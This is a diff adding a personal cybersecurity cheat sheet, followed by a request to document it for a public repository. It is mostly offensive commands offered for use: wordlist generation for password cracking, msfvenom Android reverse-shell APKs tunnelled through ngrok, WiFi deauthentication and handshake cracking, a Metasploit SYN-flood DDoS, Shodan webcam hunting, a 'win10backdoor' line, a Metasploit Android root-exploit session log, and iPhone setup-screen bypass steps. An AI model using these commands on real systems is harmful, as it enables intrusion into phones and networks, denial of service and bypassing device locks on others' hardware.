@@ -1,0 +1,224 @@
+the Origin of Rayishper is from "Raymond helper" made Rayishper out of that: basicly every time i took cyber security notes i woud write on this:
+                                                     ____
+....................................................(z00m).............................................................
+                                              
+//......................................worslister scripts commands...................................................//
+
+$ python3 wordlister.py --input /home/ragmer09toske/Desktop/cat_wordlister.txt --perm 2 --min 6 --max 32
+
+           $ python3 wordlister.py --input list.txt --perm 2 --min 6 --max 32 --leet
+          what leet does is it will transform any letters into numbers using leetspeak:
+
+           $ python3 wordlister.py --input list.txt --perm 2 --min 6 --max 32 --cap
+                 cap option will capitalize the first letter of each password:
+
+           $ python wordlister.py --input list.txt --perm 2 --min 6 --max 32 --up
+             The up option will transform every letter in a word into uppercase:
+
+           $ python3 wordlister.py --input list.txt --perm 2 --min 6 --max 32 --append 1969
+                The append option will append any given word to all passwords:
+
+           $ python3 wordlister.py --input list.txt --perm 2 --min 6 --max 32 --prepend Dave
+                The prepend option will prepend any given word to all passwords:
+
+           $ python3 wordlister.py --input list.txt --perm 2 --min 6 --max 32 --leet --cap --append 1969
+          And, of course, any of these options can be combined for a greater number of potential passwords:
+            
+      $ wordlister.py --input list.txt --perm 2 --min 6 --max 32 --leet --cap --append 1969 > mywordlist.txt
+                        direct the output to a text file that can be used for cracking later:
+
+
+          +..................................................................................................+
+          |..................link to getting an andrion device on my sys.....................................|
+          |         $ wget http://dl.google.com/android/android-sdk_r24.4.1-linux.tgz                        |
+          +..................................................................................................+
+
+          /*........................................ngrok....................................................*/
+
+                                              $ ./ngrok http 80 
+
+    ________________________________________/*TCP PORT FORWARDING WITH NGROK*/______________________________________
+    \                                                                                                              /
+     \                                      $ ngrok tcp 8080                                                      /
+      \                                                                                                          /
+       \                   !make ngrok a host by coping the generated  tcp tannel!                              /
+        \                                                                                                      /
+         \                          $ host <copied tannel><enter>                                             /
+          \  (remember to bare in mind that the numbers after a ':' in the generated tannel are for LPORT )  /
+           \               !USE THE GENERATED ADRESS TO GREAT A PAYLOAD!                                    /
+            \__________________________/*GENERATING A PAYLOAD WITH NGROK*/_________________________________/
+
+$ msfvenom -p android/meterpreter_reverse_tcp LHOST=<copied adress> LPORT=<copied port> R> /var/www/html/name.apk
+
+
+        //.................................................................................................//
+        <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<Aricrack>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+        |               ____________________________bruteforcing________________________________            |
+        |                                                                                                   |
+        |                                        sudo is my bitch                                           |
+        |         $ airmon-ng start wlan0                                                                   |
+        |         $ airodump-ng wlan0mon                                                                    |
+        |         $ airodump-ng wlan0mon -c <ch> --bssid <target mac> -w /location+name/ <enter>            |
+        |         _____________________________CATCHING___A___HANDSHAKE_______________________________      |
+        |                             $ aireplay-ng -0 4 -a <bssid> wlan0mon                                |
+        |                                                                                                   |
+        |                                                                                                   |
+        |___________________________________________________________________________________________________|
+        |         |$ aircrack-ng -w <the location of the wordlist> <handshakeme-01.cap> |                   |
+        <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<(3ND)>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+                                       RAY.MOND.09|THE UPRISING OF A GOD              
+
+============================================ STILL A SCRIPT KIDDIE ==========================================
+
+                                                   _______
+**************************************************(!1ights)**************************************************
+                                     ______________________________________
+/.....................................(DDos attack with metasploit's synflood)............................../
+
+     $                                   nmap -p1-65535 <ip-Adress>
+     msf                                 search for synflood auxiliary in msf
+     msf                                 set the RHOST to the target sys
+     msf                                 set NUM to 0
+     msf                                 set RPORT to the target's open port 
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+|.....................................depackaging and installing a tar.gzpackage................................
+|...............................................................................................................
+                       ====================(tar -zxvf <file name>)========================
+                      /                                                                  \
+                     /            from here depending on what the package holds,          \
+                    /        or may the current case, CD into a suitable Directory to      \
+                   /     find a .sh extansion file. usually it need a permission to run,    \
+                  /                     so input the following command                       \
+                 /   |$ chmod +x <filename.sh> <enter> and ./filename.sh to run thatprogram|  \             
+                /                                                                              \
+               ==================================================================================
+___________________________________________________________(Repo's)_______________________________________________
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<(Do it as a super user)>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+     # nano /etc/apt/sources.list
+     ...after editing the list...
+# <crt+o><enter> to save the the new lists
+# apt update 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<3nD>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+_________________________________________________________(MSF CONSOLE)____________________________________________
+
+     msf5> sissions -i <session ID number>
+____________________________________................___________3nD___________...................__________________
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<(All hail to KING SHODAN)>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+     $ shodan search <options>
+
+     in this case <webcamxp>
+
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<(MAKETH WAY FOR THE KING)>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+crunch 6 9 leap | aircrack-ng -a 2 <location of a .cap file> -b <bssid> -w-
+__________________________________________________________________________________________________________________
+win10backdoor 192.168.43.132 8080
+
+________________________________________________--hardWare--_______________________________________________________
+sudo dmidecode --type memory
+
+ _____________________________________________
++                                             +
+|THE LIGION OF DOOM HAS BEGAN (2021/09/DAY-13)|
++_____________________________________________+
+
+=====================chmod====================
+---------------change mode!!!!!!!-------------
+                   _____
+------------------(USERS)---------------------
+	    [ u = user/owner ]
+            [ g = group      ]
+            [ o = other      ]
+            [ a = all        ]
+----------------------------------------------
+
+        <<<<<<<<>>symbolics>>>>>>>>>>
+        + :Adds permission to a file
+        - :Removes permissios
+        = :Sets new permission
+          <<<<<<numeric>>>>>>>
+            765:
+            user
+                read   --r
+                write  --w
+                execute--x
+            group
+                read
+                write
+
+            All
+                read
+           ___________________________     
+___________changing the file ownership___________
+--------------------chown------------------------
+change ownership!!!!
+
+#sudo chown <user>:<group> <filename>
+eg: #sudo chmod root:root brainers
+    #sudo chmod root brainers
+if you need to change only the group use:
+
+[++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]
++-----------------------------------+                                        +-------------------------------------------------+
+|                                   | Attempting root privilage on an Android|                                                 |
++-----------------------------------+                                        +-------------------------------------------------+
+msf5 exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                        Information          Connection
+  --  ----  ----                        -----------          ----------
+  1         meterpreter dalvik/android  u0_a112 @ localhost  192.168.0.101:4444 -> 192.168.0.101:51480 (192.168.0.101)
+
+msf5 exploit(multi/handler) > use exploit/android/local/su_exec
+[*] Using configured payload linux/aarch64/meterpreter/reverse_tcp
+msf5 exploit(android/local/su_exec) > set payload linux/x64/meterpreter/reverse_tcp
+payload => linux/x64/meterpreter/reverse_tcp
+msf5 exploit(android/local/su_exec) > set LHOST 192.168.0.101
+LHOST => 192.168.0.101
+msf5 exploit(android/local/su_exec) > set LPORT 4455
+LPORT => 4455
+msf5 exploit(android/local/su_exec) > set SESSION -1
+SESSION => -1
+msf5 exploit(android/local/su_exec) > run
+
+[!] SESSION may not be compatible with this module.
+[*] Started reverse TCP handler on 192.168.0.101:4455
+[*] Sending stage (3012516 bytes) to 192.168.0.101
+[*] Meterpreter session 2 opened (192.168.0.101:4455 -> 192.168.0.101:42868) at 2020-07-20 17:41:25 +0800
+[*] Command Stager progress - 100.00% done (1362/1362 bytes)
+
+meterpreter >
+===============================================================================================================================
+===============================================================================================================================
+                                               __________________________________
+______________________________________________(get the Default gateway IP Address)_______________________________________________
+                                               ----------------------------------
+[route -n]
+[ip route]
++-------------------------------------------------------------------------------------------------------------------------------+
+|                        ___________________________jailbreaking an iphone_________________________                             |
++---------------++--------------------------------------------------------------------------++----------------------------------+
+		||------Jailbreak using checkra1n for linux first---------------------------||
+		||	open a terminal tab and paste:					    ||
+		||	sudo apt install libusbmuxd-tool				    ||
+		||	iproxy 2022 44                                                      ||
+		||	NEW TERMINAL TAB NOW                                                ||
+		||	ssh root@localhost -p 2022                                          ||
+		||	pass: alpine                                                        ||
+		||	mount -o rw,union,update /                                          ||
+		||	echo “” >> /.mount_rw                                               ||
+		||	mv /Applications/Setup.app/Setup /Applications/Setup.app/Setup.bak  ||
+		||	uicache -a                                                          || 
+		||	killall backboardd                                                  ||
+                ||------DONE----------------------------------------------------------------||
+
+[ray.mond.09 on the leash]
+
+
+
+i alwys had too look at my notes to do something i consider cool, or write a lot of code, i decided it would better if i just automade it.
+
+make a documatation for this, md file, its a public repo. write all the dependancies needed to run or use this script, it made on kali linux, which most the tools used in this script
